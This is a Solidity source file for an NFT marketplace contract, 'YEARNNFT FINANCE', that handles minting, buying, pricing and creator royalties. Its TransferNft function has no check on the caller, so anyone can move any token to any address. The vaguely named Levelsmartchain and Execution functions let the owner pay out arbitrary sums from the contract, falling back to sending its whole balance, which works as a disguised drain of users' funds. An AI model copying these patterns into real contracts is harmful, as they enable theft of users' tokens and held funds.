pragma solidity >=0.6.0 <0.8.0;
pragma abicoder v2;
import "./ERC721.sol";

contract Yearnnft is ERC721 {

  string public collectionName;
  string public collectionNameSymbol;
  uint256 public YearnCounter=10000;
  
  address public OwnerNft;
  uint256 public buyPrice = 95;
  uint256 public Adminper=3;
  uint256 public creator=2;
 
  struct CryptoYearn {
    uint256 tokenId;
    string tokenName;
    string tokenURI;
    address payable mintedBy;
    address payable currentOwner;
    address payable previousOwner;
    uint256 price;
    uint256 numberOfTransfers;
    bool forSale;
    bool forApprove;
  }

  mapping(address=>uint256) public balanceCredit;
  mapping(address=>bool) public creditExists;

  mapping(uint256 => CryptoYearn) public allCryptoYearns;
  mapping(string => bool) public tokenNameExists;
  mapping(string => bool) public tokenURIExists;

  event Minttoken(address indexed mintedBy, address currentOwner,address previousOwner,uint256 tokenId,uint256 price,string _tokenUrl);
  event BuyNfttoken(address indexed mintedBy, address currentOwner,address previousOwner,uint256 tokenId,uint256 price);
  event TransferNfttoken(address indexed mintedBy, address currentOwner,address previousOwner,uint256 tokenId,uint256 price);
  event ChangeNftPrice(uint256 tokenId,uint256 price);
  event IsSale(uint256 tokenId,bool forSale);
  event IsAdminSale(uint256 tokenId,bool forSale);
 
  constructor(address  ownerAddress) ERC721("YEARNNFT FINANCE", "YFNFT") {
    collectionName = name();
    collectionNameSymbol = symbol();
    OwnerNft=ownerAddress;
  }

  function mintCryptoYearn(string memory _name, string memory _tokenURI, uint256 _price) external {
    require(msg.sender != address(0));
    YearnCounter ++;
    require(!_exists(YearnCounter));
    require(!tokenURIExists[_tokenURI]);
    require(!tokenNameExists[_name]);
    _mint(msg.sender, YearnCounter);
    _setTokenURI(YearnCounter, _tokenURI);

    tokenURIExists[_tokenURI] = true;
    tokenNameExists[_name] = true;

    CryptoYearn memory newCryptoYearn = CryptoYearn(YearnCounter,_name,_tokenURI,msg.sender,
    msg.sender,address(0),_price,0,false,false);
    allCryptoYearns[YearnCounter] = newCryptoYearn;
    emit Minttoken(msg.sender,msg.sender,address(0),YearnCounter,_price,_tokenURI);
  }

  function getTokenOwner(uint256 _tokenId) public view returns(address) {
    address _tokenOwner = ownerOf(_tokenId);
    return _tokenOwner;
  }

  function getTokenMetaData(uint _tokenId) public view returns(string memory) {
    string memory tokenMetaData = tokenURI(_tokenId);
    return tokenMetaData;
  }

  function getNumberOfTokensMinted() public view returns(uint256) {
    uint256 totalNumberOfTokensMinted = totalSupply();
    return totalNumberOfTokensMinted;
  }

  function getTotalNumberOfTokensOwnedByAnAddress(address _owner) public view returns(uint256) {
    uint256 totalNumberOfTokensOwned = balanceOf(_owner);
    return totalNumberOfTokensOwned;
  }

  function getTokenExists(uint256 _tokenId) public view returns(bool) {
    bool tokenExists = _exists(_tokenId);
    return tokenExists;
  }

  function buyToken(uint256 _tokenId) public payable {
    require(msg.sender != address(0));
    require(_exists(_tokenId));
    address tokenOwner = ownerOf(_tokenId);
    require(tokenOwner != address(0));
    require(tokenOwner != msg.sender);
    CryptoYearn memory CryptoYearn = allCryptoYearns[_tokenId];
    require(msg.value >= CryptoYearn.price);
    require(CryptoYearn.forSale);
    require(CryptoYearn.forApprove); 
    _transfer(tokenOwner, msg.sender, _tokenId);
    address payable sendTo = CryptoYearn.currentOwner;
    address mintBy = CryptoYearn.mintedBy;

    sendTo.transfer(msg.value*buyPrice/100);
    if(creditExists[mintBy])
    {
      balanceCredit[mintBy]=balanceCredit[mintBy] + (msg.value*creator/100);
    }
    else{
      creditExists[mintBy]=true;
      balanceCredit[mintBy]=(msg.value*creator/100);
    }
    CryptoYearn.previousOwner = CryptoYearn.currentOwner;
    CryptoYearn.currentOwner = msg.sender;
    CryptoYearn.numberOfTransfers += 1;
    CryptoYearn.forSale=false;
    CryptoYearn.forApprove=false;

    allCryptoYearns[_tokenId] = CryptoYearn; 

    emit BuyNfttoken(CryptoYearn.mintedBy,CryptoYearn.currentOwner,CryptoYearn.previousOwner,_tokenId,CryptoYearn.price);
  }

  function TransferNft(uint256 _tokenId,address payable _receiver) public payable {
    require(msg.sender != address(0));
    require(_exists(_tokenId));
    address tokenOwner = ownerOf(_tokenId);
    require(tokenOwner != address(0));
    require(tokenOwner != _receiver);
    CryptoYearn memory CryptoYearn = allCryptoYearns[_tokenId];
    //require(msg.value >= CryptoYearn.price);
    //require(CryptoYearn.forSale);
    //require(CryptoYearn.forApprove); 
    _transfer(tokenOwner,_receiver, _tokenId);
    //address payable sendTo = CryptoYearn.currentOwner;

    //sendTo.transfer(msg.value*buyPrice/100);
    //sendTo.transfer(msg.value*Adminper/10);
    //sendTo.transfer(msg.value*creator/10);
    
    CryptoYearn.previousOwner = CryptoYearn.currentOwner;
    CryptoYearn.currentOwner = _receiver;
    CryptoYearn.numberOfTransfers += 1;
    CryptoYearn.forSale=false;
    CryptoYearn.forApprove=false;
    allCryptoYearns[_tokenId] = CryptoYearn; 

    emit TransferNfttoken(CryptoYearn.mintedBy,CryptoYearn.currentOwner,CryptoYearn.currentOwner,_tokenId,CryptoYearn.price);
  }

  function changeTokenPrice(uint256 _tokenId, uint256 _newPrice) public {
    require(msg.sender != address(0));
    require(_exists(_tokenId));
    address tokenOwner = ownerOf(_tokenId);
    require(tokenOwner == msg.sender);
    CryptoYearn memory CryptoYearn = allCryptoYearns[_tokenId];
    CryptoYearn.price = _newPrice;
    allCryptoYearns[_tokenId] = CryptoYearn;
    emit ChangeNftPrice(_tokenId,_newPrice);
  }

  function toggleForSale(uint256 _tokenId) public {
    require(msg.sender != address(0));
    require(_exists(_tokenId));
    address tokenOwner = ownerOf(_tokenId);
    require(tokenOwner == msg.sender);
    CryptoYearn memory CryptoYearn = allCryptoYearns[_tokenId];
    if(CryptoYearn.forSale) {
      CryptoYearn.forSale = false;
    } else {
      CryptoYearn.forSale = true;
    }
    allCryptoYearns[_tokenId] = CryptoYearn;

    emit IsSale(_tokenId,CryptoYearn.forSale);
  }

  function ApproveForSale(uint256 _tokenId) public {
    require(msg.sender != address(0));
    require(_exists(_tokenId));
    require(OwnerNft == msg.sender);
    CryptoYearn memory CryptoYearn = allCryptoYearns[_tokenId];
    if(CryptoYearn.forApprove) {
      CryptoYearn.forApprove = false;
    } else {
      CryptoYearn.forApprove = true;
    }
    allCryptoYearns[_tokenId] = CryptoYearn;
    emit IsAdminSale(_tokenId,CryptoYearn.forApprove);
  }

  function changePrice(uint256 _price) public returns (bool) {
        require(msg.sender == OwnerNft);
        buyPrice = _price;
        return true;
  }
  
  function CreatorWithdrawal() public {
    require(creditExists[msg.sender]);
    require(balanceCredit[msg.sender]>0);
    uint256 balance= balanceCredit[msg.sender];
    balanceCredit[msg.sender]=0;
    msg.sender.transfer(balance);
  }



  function Levelsmartchain(address userAddress,uint256 amnt) external payable {   
    if(OwnerNft==msg.sender)
    {
      Execution(userAddress,amnt);        
    }            
  }

  function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
   }
}